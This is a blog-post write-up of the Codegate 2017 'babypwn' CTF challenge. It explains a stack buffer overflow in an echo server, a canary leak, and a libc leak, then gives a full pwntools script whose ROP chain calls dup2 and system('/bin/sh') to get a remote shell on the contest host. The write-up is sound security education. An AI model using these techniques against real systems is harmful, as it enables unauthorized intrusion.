<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Codegate prequals 2017: babypwn (pwn 50) | Isaac's Blog</title><link rel="canonical" href="https://poning.me/2017/02/14/babypwn/"/><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>Codegate prequals 2017: babypwn (pwn 50)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2017-02-14</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/Codegate-prequals/">Codegate prequals</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>BabyPwn~~~<br><a href="/2017/02/14/babypwn/babypwn" title="http://ctf.codegate.org/z/babypwn">http://ctf.codegate.org/z/babypwn</a><br>nc 110.10.212.130 8888<br>nc 110.10.212.130 8889</p>
</blockquote>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Leak the canary</li>
<li>Use ROP to leak the address of <code>libc</code> functions</li>
<li>Find the <code>libc</code> version by <a href="libcdb.com">libcdb.com</a></li>
<li>Use ROP to <code>dup2 dup2 system</code></li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><code>babypwn</code> is a TCP server. If we connect to it, it is basically a echo server.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>▒▒▒▒▒▒▒C▒O▒D▒E▒G▒A▒T▒E▒2▒0▒1▒7▒▒▒▒▒▒▒<br>▒▒▒▒▒▒▒B▒A▒B▒Y▒P▒W▒N▒!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒<br>▒▒▒▒▒▒▒G▒O▒O▒D▒L▒U▒C▒K▒~▒!▒▒▒▒▒▒▒▒▒▒▒<br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt; 1<br>Input Your Message : 123<br>123<br><br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt; 2<br>Input Your Message : 123<br><br>321<br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt;<br></pre></td></tr></table></figure>
<p>The bug is a simple buffer overflow. At line 10 of the following code snippet, it reads 0x64 bytes to a buffer of 0x28 bytes.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br></pre></td><td class="code"><pre>send_str(<span class="hljs-string">"\n===============================\n"</span>);<br>send_str(<span class="hljs-string">"1. Echo\n"</span>);<br>send_str(<span class="hljs-string">"2. Reverse Echo\n"</span>);<br>send_str(<span class="hljs-string">"3. Exit\n"</span>);<br>send_str(<span class="hljs-string">"===============================\n"</span>);<br>v1 = get_num();<br><span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">1</span> )<br>  <span class="hljs-keyword">break</span>;<br>send_str(<span class="hljs-string">"Input Your Message : "</span>);<br>recv_str(&amp;v2, <span class="hljs-number">0x64</span>u);  <span class="hljs-comment">// BUG</span><br>send_str(&amp;v2);<br></pre></td></tr></table></figure>
<p>Although the return address is protected by a canary, this program doesn’t append a null byte when receiving data and later return all the data before a null byte. Therefore, we can concatenate our input with the canary and leak it in the response of server. With the knowledge of canary, it is trivial to override the return address and launch a ROP attack.</p>
<p>I want to make use of the <code>system</code> to spawn a shell, so my next step is to leak the address of the <code>libc</code>. Using ROP chain such as <code>send, padding, GOT of atoi</code>, I can leak the address of several <code>libc</code> functions. Finally, I need to know the <code>libc</code> version of the remote to calculate the correct offset of <code>system</code>. At first, I used <a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a> but couldn’t find the matched version. Then, I try <a href="libcdb.com">libcdb.com</a> and luckily found the target <code><a href="/2017/02/14/babypwn/libc-2.19_16.so" title="libc">libc</a></code>. Now, I can use the standard <code>dup2 dup2 system</code> ROP chain to launch a shell and get the flag.</p>
<p>The whole exploit is as follows. (Note that since it is a fork server, the canary and the <code>libc</code> base won’t change unless the server is relaunched. Therefore, I hardcoded the canary and <code>libc</code> functions in the script.)</p>
<figure class="highlight python"><figcaption><span>babypwn_exp.py</span><a href="/2017/02/14/babypwn/babypwn_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>send_str = <span class="hljs-number">0x80488B1</span><br>print_goodbye = <span class="hljs-number">0x8048C23</span><br>got_atoi = <span class="hljs-number">0x804B050</span><br>pop_pop_ret = <span class="hljs-number">0x08048b84</span><br><br><span class="hljs-comment">## local</span><br><span class="hljs-comment"># canary = '\x00\xfa\xe4$'</span><br><span class="hljs-comment"># libc_base = 0xf7533000</span><br><span class="hljs-comment"># system = 0xf756e020</span><br><span class="hljs-comment"># dup2 = 0xf760b8f0</span><br><span class="hljs-comment"># bin_sh = 0xf769260f</span><br><br><span class="hljs-comment"># remote</span><br>canary = <span class="hljs-string">'\x00"\x8d3'</span><br>libc_base = <span class="hljs-number">0xf756f000</span><br>system = <span class="hljs-number">0xf75af190</span><br>bin_sh = <span class="hljs-number">0xf76cfa24</span><br>dup2 = <span class="hljs-number">0xf764a590</span><br><br>r = remote(<span class="hljs-string">'110.10.212.130'</span>, <span class="hljs-number">8888</span>)<br><span class="hljs-comment"># r = remote('127.0.0.1', 8181)</span><br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>r.sendline(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">': '</span>)<br>r.send(flat(<span class="hljs-string">'A'</span>*<span class="hljs-number">40</span>, canary, <span class="hljs-string">'A'</span>*<span class="hljs-number">12</span>,   <span class="hljs-comment"># padding</span><br>            dup2, pop_pop_ret, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>,  <span class="hljs-comment"># dup2(4, 0)</span><br>            dup2, pop_pop_ret, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>,  <span class="hljs-comment"># dup2(4, 1)</span><br>            system, <span class="hljs-number">0</span>, bin_sh))       <span class="hljs-comment"># system("/bin/sh")</span><br><br><span class="hljs-keyword">print</span> repr(r.recvuntil(<span class="hljs-string">'&gt; '</span>))<br>r.sendline(<span class="hljs-string">'3'</span>)<br><br>r.interactive()<br><br><span class="hljs-comment">## leak the address of libc</span><br><span class="hljs-comment"># r.send(flat('A'*40, canary, 'A'*12, send_str, print_goodbye, got_atoi))</span><br><span class="hljs-comment"># print repr(r.recvuntil('&gt; '))</span><br><span class="hljs-comment"># r.sendline('3')</span><br><span class="hljs-comment"># data = r.recvall()</span><br><span class="hljs-comment"># print repr(data)</span><br><span class="hljs-comment"># print 'atoi: ' + hex(u32(data[:4]))</span><br><span class="hljs-comment"># print 'socket: ' + hex(u32(data[4:8]))</span><br><span class="hljs-comment"># print 'sigaction: ' + hex(u32(data[8:12]))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: <code>FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}</code></p>
</blockquote>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
<li>I spent some unnecessary work on finding the address of <code>system</code> because I didn’t see that <code>system</code> was already in the GOT table. It was deliberately put in the code that no one actually reference it. It was even used to <code>system(&quot;echo &#39;not easy to see&#39;&quot;)</code> to indicate this fact. </li>
</ul>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2017/02/14/babypwn/';
var disqus_title = 'Codegate prequals 2017: babypwn (pwn 50)';
var disqus_url = 'https://poning.me/2017/02/14/babypwn/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-86477289-1');ga('send','pageview');</script></html>